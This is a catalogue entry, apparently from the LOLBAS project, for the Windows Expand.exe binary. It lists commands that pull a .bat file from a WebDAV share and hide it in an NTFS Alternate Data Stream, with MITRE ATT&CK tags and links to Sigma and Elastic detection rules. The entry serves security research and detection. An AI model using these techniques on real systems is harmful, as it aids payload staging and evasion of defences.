---
Name: Expand.exe
Description: Binary that expands one or more compressed files
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: expand \\webdav\folder\file.bat c:\ADS\file.bat
    Description: Copies source file to destination.
    Usecase: Use to copies the source file to the destination file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: expand c:\ADS\file1.bat c:\ADS\file2.bat
    Description: Copies source file to destination.
    Usecase: Copies files from A to B
    Category: Copy
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
    Description: Copies source file to destination Alternate Data Stream (ADS)
    Usecase: Copies files from A to B
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\Expand.exe
  - Path: C:\Windows\SysWOW64\Expand.exe
Code_Sample:
- Code:
Detection:
 - Sigma: https://github.com/SigmaHQ/sigma/blob/b25fbbea54014565fc4551f94c97c0d7550b1c04/rules/windows/process_creation/sysmon_expand_cabinet_files.yml
 - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
Resources:
  - Link: https://twitter.com/infosecn1nja/status/986628482858807297
  - Link: https://twitter.com/Oddvarmoe/status/986709068759949319
Acknowledgement:
  - Person: Rahmat Nurfauzi
    Handle: '@infosecn1nja'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
